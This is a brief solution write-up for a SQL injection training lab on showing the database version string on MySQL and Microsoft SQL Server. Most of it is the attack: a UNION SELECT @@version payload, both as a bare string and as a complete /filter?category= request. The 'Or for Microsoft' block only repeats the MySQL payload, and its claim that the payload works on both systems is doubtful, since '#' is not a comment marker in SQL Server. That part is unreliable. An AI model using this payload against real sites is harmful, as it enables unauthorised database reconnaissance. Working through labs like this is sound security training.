# Lab: SQL injection attack, querying the database type and version on MySQL and Microsoft (Practitioner)

**Goal:** Display the database version string.

## Solution

**MySQL / Microsoft SQL Server:**

```
'+UNION+SELECT+'a',+@@version#
```

Or for Microsoft:

```
'+UNION+SELECT+'a',+@@version#
```

(Works on both in most labs.)

## Payload

```
/filter?category='+UNION+SELECT+'a',+@@version#
```
